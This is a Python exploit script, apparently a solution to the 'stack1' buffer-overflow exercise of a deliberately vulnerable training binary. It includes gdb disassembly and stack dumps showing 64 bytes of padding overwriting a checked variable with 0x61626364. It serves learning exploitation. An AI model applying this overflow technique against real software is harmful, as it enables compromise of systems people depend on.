#!/usr/bin/python3
from subprocess import Popen, PIPE
import shlex
import struct

'''
	+----------+
	| A A A A  |  <=== FP-72 [ACID] : gets(FP-72) 
	+----------+-\
	   ...       |
	    ...      | 64 bytes in between
	     ...     |
	+----------+-/
	|    VAR   |  <=== FP-8 (var being checked with 0x61626364)
	+----------+
	| saved FP |
	+----------+
	| saved LR |  <--- FP 
	+----------+

(gdb) b *main+76
Breakpoint 3 at 0x104fc
(gdb) b *main+80
(gdb) r $(python3 -c "import struct;print('A'*64 + struct.pack('<i', 0x61626364).decode('utf-8'))")

   0x000104fc <+76>:    bl      0x10340 <strcpy@plt>
   0x00010500 <+80>:    ldr     r3, [r11, #-8]		; variable location whose value is being checked
   0x00010504 <+84>:    ldr     r2, [pc, #48]   	; 0x1053c <main+140>
=> 0x00010508 <+88>:    cmp     r3, r2

(gdb) x/4b 0x1053c
0x1053c <main+140>:     0x64    0x63    0x62    0x61
(gdb) i r $r2
r2             0x61626364       1633837924


STACK state before ACID rain
(gdb) x/20xw $fp-72
(gdb) x/20xw $fp-72
0xbefff1a4:     0xb6ffbfc4      0x00000003      0xb6e77be8      0x00000000
0xbefff1b4:     0xb6e779f8      0xbefff1f0      0xb6fd618c      0x00000000
0xbefff1c4:     0x00000000      0x00010478      0x00010598      0xb6fb2ba0
0xbefff1d4:     0x00010548      0x00000000      0x00010388      0x00000000
0xbefff1e4:     0x00000000      0x00000000      0xb6e8c294      0xb6fb1000

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba

STACK state after ACID rain
(gdb) x/20xw $fp-72
0xbefff1a4:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff1b4:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff1c4:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff1d4:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff1e4:     0x61626364      0x00000000      0xb6e8c294      0xb6fb1000
'''

target = "./stack1"

# 65th byte will corrupt the variable being sanity checked
payload = 'A'*64		
payload += struct.pack('<i', 0x61626364).decode('utf-8')

# write payload to disk (for manual exploitation)
fo = open(target + '.input', 'wb')
fo.write(payload.encode('utf-8'))
fo.close

target = target + " " + payload

p = Popen(shlex.split(target))
